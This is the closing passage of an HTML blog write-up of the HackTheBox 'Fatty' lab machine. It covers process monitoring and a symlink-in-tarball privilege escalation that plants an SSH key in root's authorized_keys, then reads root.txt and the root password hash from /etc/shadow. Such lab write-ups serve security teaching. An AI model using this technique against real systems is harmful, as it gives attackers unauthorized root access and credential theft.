</span></span><span class=line><span class=cl><span class=mi>2020</span><span class=o>/</span><span class=mi>07</span><span class=o>/</span><span class=mi>30</span> <span class=mi>20</span><span class=p>:</span><span class=mi>52</span><span class=p>:</span><span class=mi>20</span> <span class=n>CMD</span><span class=p>:</span> <span class=n>UID</span><span class=o>=</span><span class=mi>1000</span> <span class=n>PID</span><span class=o>=</span><span class=mi>1754</span>   <span class=o>|</span> <span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>sh</span>
</span></span><span class=line><span class=cl><span class=mi>2020</span><span class=o>/</span><span class=mi>07</span><span class=o>/</span><span class=mi>30</span> <span class=mi>20</span><span class=p>:</span><span class=mi>52</span><span class=p>:</span><span class=mi>20</span> <span class=n>CMD</span><span class=p>:</span> <span class=n>UID</span><span class=o>=</span><span class=mi>0</span>    <span class=n>PID</span><span class=o>=</span><span class=mi>11</span>     <span class=o>|</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>sshd</span>
</span></span><span class=line><span class=cl><span class=mi>2020</span><span class=o>/</span><span class=mi>07</span><span class=o>/</span><span class=mi>30</span> <span class=mi>20</span><span class=p>:</span><span class=mi>52</span><span class=p>:</span><span class=mi>20</span> <span class=n>CMD</span><span class=p>:</span> <span class=n>UID</span><span class=o>=</span><span class=mi>1000</span> <span class=n>PID</span><span class=o>=</span><span class=mi>10</span>     <span class=o>|</span> <span class=n>java</span> <span class=o>-</span><span class=n>jar</span> <span class=o>/</span><span class=n>opt</span><span class=o>/</span><span class=n>fatty</span><span class=o>/</span><span class=n>fatty</span><span class=o>-</span><span class=n>server</span><span class=o>.</span><span class=n>jar</span>
</span></span><span class=line><span class=cl><span class=mi>2020</span><span class=o>/</span><span class=mi>07</span><span class=o>/</span><span class=mi>30</span> <span class=mi>20</span><span class=p>:</span><span class=mi>52</span><span class=p>:</span><span class=mi>20</span> <span class=n>CMD</span><span class=p>:</span> <span class=n>UID</span><span class=o>=</span><span class=mi>0</span>    <span class=n>PID</span><span class=o>=</span><span class=mi>1</span>      <span class=o>|</span> <span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>sh</span> <span class=o>./</span><span class=n>start</span><span class=o>.</span><span class=n>sh</span>
</span></span><span class=line><span class=cl><span class=mi>2020</span><span class=o>/</span><span class=mi>07</span><span class=o>/</span><span class=mi>30</span> <span class=mi>20</span><span class=p>:</span><span class=mi>53</span><span class=p>:</span><span class=mi>01</span> <span class=n>CMD</span><span class=p>:</span> <span class=n>UID</span><span class=o>=</span><span class=mi>0</span>    <span class=n>PID</span><span class=o>=</span><span class=mi>2298</span>   <span class=o>|</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>sshd</span> <span class=o>-</span><span class=n>R</span>
</span></span><span class=line><span class=cl><span class=mi>2020</span><span class=o>/</span><span class=mi>07</span><span class=o>/</span><span class=mi>30</span> <span class=mi>20</span><span class=p>:</span><span class=mi>53</span><span class=p>:</span><span class=mi>01</span> <span class=n>CMD</span><span class=p>:</span> <span class=n>UID</span><span class=o>=</span><span class=mi>22</span>   <span class=n>PID</span><span class=o>=</span><span class=mi>2299</span>   <span class=o>|</span> <span class=n>sshd</span><span class=p>:</span> <span class=p>[</span><span class=n>net</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=mi>2020</span><span class=o>/</span><span class=mi>07</span><span class=o>/</span><span class=mi>30</span> <span class=mi>20</span><span class=p>:</span><span class=mi>53</span><span class=p>:</span><span class=mi>01</span> <span class=n>CMD</span><span class=p>:</span> <span class=n>UID</span><span class=o>=</span><span class=mi>0</span>    <span class=n>PID</span><span class=o>=</span><span class=mi>2300</span>   <span class=o>|</span> <span class=n>sshd</span><span class=p>:</span> <span class=n>qtc</span> <span class=p>[</span><span class=n>priv</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=mi>2020</span><span class=o>/</span><span class=mi>07</span><span class=o>/</span><span class=mi>30</span> <span class=mi>20</span><span class=p>:</span><span class=mi>53</span><span class=p>:</span><span class=mi>01</span> <span class=n>CMD</span><span class=p>:</span> <span class=n>UID</span><span class=o>=</span><span class=mi>1000</span> <span class=n>PID</span><span class=o>=</span><span class=mi>2301</span>   <span class=o>|</span> <span class=n>ash</span> <span class=o>-</span><span class=n>c</span> <span class=n>scp</span> <span class=o>-</span><span class=n>f</span> <span class=o>/</span><span class=n>opt</span><span class=o>/</span><span class=n>fatty</span><span class=o>/</span><span class=n>tar</span><span class=o>/</span><span class=n>logs</span><span class=o>.</span><span class=n>tar</span>
</span></span><span class=line><span class=cl><span class=mi>2020</span><span class=o>/</span><span class=mi>07</span><span class=o>/</span><span class=mi>30</span> <span class=mi>20</span><span class=p>:</span><span class=mi>54</span><span class=p>:</span><span class=mi>02</span> <span class=n>CMD</span><span class=p>:</span> <span class=n>UID</span><span class=o>=</span><span class=mi>0</span>    <span class=n>PID</span><span class=o>=</span><span class=mi>2302</span>   <span class=o>|</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>sshd</span> <span class=o>-</span><span class=n>R</span>
</span></span><span class=line><span class=cl><span class=mi>2020</span><span class=o>/</span><span class=mi>07</span><span class=o>/</span><span class=mi>30</span> <span class=mi>20</span><span class=p>:</span><span class=mi>54</span><span class=p>:</span><span class=mi>02</span> <span class=n>CMD</span><span class=p>:</span> <span class=n>UID</span><span class=o>=</span><span class=mi>22</span>   <span class=n>PID</span><span class=o>=</span><span class=mi>2303</span>   <span class=o>|</span> <span class=n>sshd</span><span class=p>:</span> <span class=p>[</span><span class=n>net</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=mi>2020</span><span class=o>/</span><span class=mi>07</span><span class=o>/</span><span class=mi>30</span> <span class=mi>20</span><span class=p>:</span><span class=mi>54</span><span class=p>:</span><span class=mi>02</span> <span class=n>CMD</span><span class=p>:</span> <span class=n>UID</span><span class=o>=</span><span class=mi>1000</span> <span class=n>PID</span><span class=o>=</span><span class=mi>2304</span>   <span class=o>|</span> <span class=n>sshd</span><span class=p>:</span> <span class=n>qtc</span>
</span></span><span class=line><span class=cl><span class=mi>2020</span><span class=o>/</span><span class=mi>07</span><span class=o>/</span><span class=mi>30</span> <span class=mi>20</span><span class=p>:</span><span class=mi>54</span><span class=p>:</span><span class=mi>02</span> <span class=n>CMD</span><span class=p>:</span> <span class=n>UID</span><span class=o>=</span><span class=mi>1000</span> <span class=n>PID</span><span class=o>=</span><span class=mi>2305</span>   <span class=o>|</span> <span class=n>scp</span> <span class=o>-</span><span class=n>f</span> <span class=o>/</span><span class=n>opt</span><span class=o>/</span><span class=n>fatty</span><span class=o>/</span><span class=n>tar</span><span class=o>/</span><span class=n>logs</span><span class=o>.</span><span class=n>tar</span>
</span></span><span class=line><span class=cl><span class=mi>2020</span><span class=o>/</span><span class=mi>07</span><span class=o>/</span><span class=mi>30</span> <span class=mi>20</span><span class=p>:</span><span class=mi>55</span><span class=p>:</span><span class=mi>01</span> <span class=n>CMD</span><span class=p>:</span> <span class=n>UID</span><span class=o>=</span><span class=mi>0</span>    <span class=n>PID</span><span class=o>=</span><span class=mi>2306</span>   <span class=o>|</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>sshd</span> <span class=o>-</span><span class=n>R</span>
</span></span><span class=line><span class=cl><span class=mi>2020</span><span class=o>/</span><span class=mi>07</span><span class=o>/</span><span class=mi>30</span> <span class=mi>20</span><span class=p>:</span><span class=mi>55</span><span class=p>:</span><span class=mi>01</span> <span class=n>CMD</span><span class=p>:</span> <span class=n>UID</span><span class=o>=</span><span class=mi>22</span>   <span class=n>PID</span><span class=o>=</span><span class=mi>2307</span>   <span class=o>|</span> <span class=n>sshd</span><span class=p>:</span> <span class=p>[</span><span class=n>net</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=mi>2020</span><span class=o>/</span><span class=mi>07</span><span class=o>/</span><span class=mi>30</span> <span class=mi>20</span><span class=p>:</span><span class=mi>55</span><span class=p>:</span><span class=mi>01</span> <span class=n>CMD</span><span class=p>:</span> <span class=n>UID</span><span class=o>=</span><span class=mi>0</span>    <span class=n>PID</span><span class=o>=</span><span class=mi>2308</span>   <span class=o>|</span> <span class=n>sshd</span><span class=p>:</span> <span class=n>qtc</span> <span class=p>[</span><span class=n>priv</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=mi>2020</span><span class=o>/</span><span class=mi>07</span><span class=o>/</span><span class=mi>30</span> <span class=mi>20</span><span class=p>:</span><span class=mi>55</span><span class=p>:</span><span class=mi>01</span> <span class=n>CMD</span><span class=p>:</span> <span class=n>UID</span><span class=o>=</span><span class=mi>1000</span> <span class=n>PID</span><span class=o>=</span><span class=mi>2309</span>   <span class=o>|</span> <span class=n>ash</span> <span class=o>-</span><span class=n>c</span> <span class=n>scp</span> <span class=o>-</span><span class=n>f</span> <span class=o>/</span><span class=n>opt</span><span class=o>/</span><span class=n>fatty</span><span class=o>/</span><span class=n>tar</span><span class=o>/</span><span class=n>logs</span><span class=o>.</span><span class=n>tar</span>
</span></span></code></pre></td></tr></table></div></div><p>After a few seconds we can see a scp that copies the tar archive that was
created by the cron job.</p><p>It seems like a scp command is run from a remote host to retrieve
<code>/opt/fatty/tar/logs.tar</code>, this must come from the docker host.</p><p>Something like that must be run from the docker host:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>scp qtc@172.28.0.4:/opt/fatty/tar/logs.tar /path/on/host/logs.tar
</span></span></code></pre></td></tr></table></div></div><h2 id=privilege-escalation-of-machine>Privilege Escalation of Machine<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine>#</a></h2><p>Ok, fasten your seat belt this is tricky.</p><p>We can guess that if a tarball is copied to the docker host automatically,
then it may be automatically extracted too.</p><p>So I&rsquo;ll try to conduct this 2 steps attack that abuse of symbolic link in
tarball when extracted.</p><ol><li>Create a tarball containing a symlink, the symlink as the same name as the
tarball so when it&rsquo;s extracted it overrides it. The symling points to a file
on the target system that we want to override to get root access.</li><li>Create a file name like the tarball that will override the target file
when copied thanks to the previous symlink abuse.</li></ol><p>One of the less dirty way to pe to root by overriding a file would be to
copy our SSH public key into root SSH authorized keys.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ln -s /root/.ssh/authorized_keys logs.tar
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>tar cvf logs.tmp.tar logs.tar
</span></span><span class=line><span class=cl>logs.tar
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>tar tvf logs.tmp.tar
</span></span><span class=line><span class=cl>lrwxrwxrwx qtc/qtc         0 2020-07-31 02:13:44 logs.tar -&gt; /root/.ssh/authorized_keys
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>cp logs.tmp.tar /opt/fatty/tar/logs.tar
</span></span></code></pre></td></tr></table></div></div><p>Then we wait for a few minutes to be sure that scp copy was done, we can
start a 2nd reverse shell and lauch <a href=https://github.com/DominicBreuker/pspy>pspy</a> again to be sure.</p><p>So the scp will copy the tarball to <code>/path/on/host/logs.tar</code> on the host.</p><p>Then it will extract it and use our malicious symlink: <code>/path/on/host/logs.tar</code>
-> <code>/root/.ssh/authorized_keys</code>.</p><p>Then we copy our SSH pubkey to replace the tarball.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>printf %s &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDceD2CV1rqU+7fcduAqZ9bK4jdOQphI7J7AYUAzmHARAp/fNq4XQet3bLg73yugh72MRT6aJUWEM2iP1/gmyRgJUxx65qESG/OAUlzIOBSQUiw2sP+3++/qsBJ76y7/xfnIq/F6YDJSaqpm+eG4G4SrVqNvKNzZTYbAXJ4Fw62bAD04cvMsDeiarkS0mAZkLUzBYI8aDimHt0J2N0OGLC/hLMDZeDzjtixb/4dVNFIoRHyZv3fTNsRLDScKxxHSP+e1CUfAQ6dtlpzqAj1IW7GkaZWxBxRIyVEtFrkYSQzM/ycYtKwhXkySPbtlO1xcjr4/FpOWfYq0LiuF71+Pt/QfwYv1UKIqJ+swZlm/zb/cpu8ESARrs5mb4OTTBwb3TSmOIj5iYaEwhXGueB/Cq7TH6HQjGDZqiOOX6q1ymiGdWfkNCAj4wywaPlIB+d90NH/G0gfuk+2CFcm2us7pIvELqGh5ZqcCGdGQtqlQBsC2HdzSkiQqlGLBIDk3fcJ/ms= cyfun@penarch&#39; &gt; /opt/fatty/tar/logs.tar
</span></span></code></pre></td></tr></table></div></div><p>Then again we wait a few minutes or monitor <a href=https://github.com/DominicBreuker/pspy>pspy</a>.</p><p>It will directly copy our key to <code>/root/.ssh/authorized_keys</code> thanks to our
malicious symlink.</p><p>Then we can connect via ssh:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ssh root@10.10.10.174
</span></span><span class=line><span class=cl>The authenticity of host &#39;10.10.10.174 (10.10.10.174)&#39; can&#39;t be established.
</span></span><span class=line><span class=cl>ED25519 key fingerprint is SHA256:vrMYTGEAjnC1vfp18WHrsxuDGfueUV0xVfzQErxMKv0.
</span></span><span class=line><span class=cl>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span><span class=line><span class=cl>Warning: Permanently added &#39;10.10.10.174&#39; (ED25519) to the list of known hosts.
</span></span><span class=line><span class=cl>Linux fatty 4.9.0-11-amd64 #1 SMP Debian 4.9.189-3+deb9u1 (2019-09-20) x86_64
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>The programs included with the Debian GNU/Linux system are free software;
</span></span><span class=line><span class=cl>the exact distribution terms for each program are described in the
</span></span><span class=line><span class=cl>individual files in /usr/share/doc/*/copyright.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span><span class=line><span class=cl>permitted by applicable law.
</span></span><span class=line><span class=cl>Last login: Thu Jul 30 15:41:03 2020 from 10.10.15.115
</span></span><span class=line><span class=cl>root@fatty:~# pwd
</span></span><span class=line><span class=cl>/root
</span></span><span class=line><span class=cl>root@fatty:~# cat root.txt
</span></span><span class=line><span class=cl>ee982fa19b413415391ed4a17b2bd9c7
</span></span><span class=line><span class=cl>root@fatty:~# cat /etc/shadow | grep root
</span></span><span class=line><span class=cl>root:$6$5wAdljn7$wUeldtzWZDEtkO9OFyNfXrrxf5jnRw8uJHij.TIsiNM0ne1QzmjclfGdgdAzRWk7AQyEmQM7RfPhJbCEms5sN/:18157:0:99999:7:::
</span></span></code></pre></td></tr></table></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li><li><a href=https://s4ch.github.io/tags/insane/>Insane</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>